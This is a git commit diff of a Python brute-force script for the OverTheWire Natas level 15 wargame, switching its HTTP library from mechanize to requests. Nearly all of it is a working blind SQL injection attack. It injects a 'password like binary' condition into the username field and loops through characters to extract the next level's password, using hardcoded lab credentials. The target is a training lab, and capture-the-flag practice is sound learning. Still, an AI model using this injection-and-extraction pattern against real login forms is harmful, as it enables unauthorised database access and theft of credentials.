627de85016d9aa7f0eb6e771221831f05356df06
Rudolf Copi Eckelberg <rudolfce@gmail.com>
2015-08-27 21:19:20 +0000

    Switched from mechanize to requests

--- bruteforce.py
+++ bruteforce.py
@@ -1,46 +1,35 @@
 import string
 
-import mechanize
-
-br = mechanize.Browser()
-br.set_handle_robots(False) # Not to be used everywhere.
+import requests
 
 natas15 = "http://natas15.natas.labs.overthewire.org"
-
-br.add_password(natas15, "natas15", "7h15154h3lL0f4p455w0rD")
-
-br.open(natas15)
-form = (br.forms()).next()
+auth = ('natas15', '7h15154h3lL0f4p455w0rD')
 
 chlist = string.letters + string.digits
 
 st = ''
 base_string = 'natas16" and password like binary "'
 
-br.form = form
 out_form = base_string + st + '_%'
-br["username"] = out_form
-response = br.submit()
-out = response.read()
+payload=dict(username=out_form)
+r = requests.post(natas15, data=payload, auth=auth)
+out = r.text
 
 while('exists' in out):
     for ch in chlist:
         print st + ch
-        br.form = form
         out_form = base_string + st + ch + '%'
-        br["username"] = out_form
-        response = br.submit()
-        out = response.read()
+        payload=dict(username=out_form)
+        r = requests.post(natas15, data=payload, auth=auth)
+        out = r.text
         if 'exists' in out:
             st = st + ch
             break
 
-    br.form = form
     out_form = base_string + st + '_%'
-    br["username"] = out_form
-    response = br.submit()
-    out = response.read()
-
+    payload=dict(username=out_form)
+    r = requests.post(natas15, data=payload, auth=auth)
+    out = r.text
 print "Done and done."
     
 exit(0)
